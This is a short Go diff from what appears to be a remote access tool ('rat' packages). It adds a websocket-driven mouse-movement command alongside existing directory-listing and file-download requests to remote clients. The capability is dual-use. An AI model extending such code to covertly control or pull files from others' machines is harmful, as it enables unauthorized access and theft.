@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"rat/client/screen"
 	"rat/common"
 	"time"
 
@@ -18,6 +19,7 @@ const (
 	MonitorQueryEvent   = 2
 	DirectoryQueryEvent = 3
 	DownloadQueryEvent  = 4
+	MouseMove           = 10
 )
 
 type Event struct {
@@ -38,6 +40,12 @@ type DirectoryRequestEvent struct {
 
 type DownloadEvent struct {
 	File string `json:"file"`
+}
+
+type MouseMoveEvent struct {
+	X       float32 `json:"x"`
+	Y       float32 `json:"y"`
+	Monitor int     `json:"id"`
 }
 
 func newEvent(event int, clientID int, data string) *Event {
@@ -133,6 +141,15 @@ func incomingWebSocket(ws *websocket.Conn) {
 			client.Listeners[common.GetFileHeader] = ws
 			Transfers[downloadEvent.File] = Transfer{file, downloadEvent.File}
 			client.Queue <- DownloadPacket{downloadEvent.File}
+		} else if event.Event == MouseMove {
+			var mouseEvent MouseMoveEvent
+			err := json.Unmarshal([]byte(event.Data), &mouseEvent)
+			if err != nil {
+				fmt.Println(err.Error())
+				break
+			}
+
+			screen.MoveCursor(mouseEvent.Monitor, int(mouseEvent.X), int(mouseEvent.Y))
 		}
 	}
 }
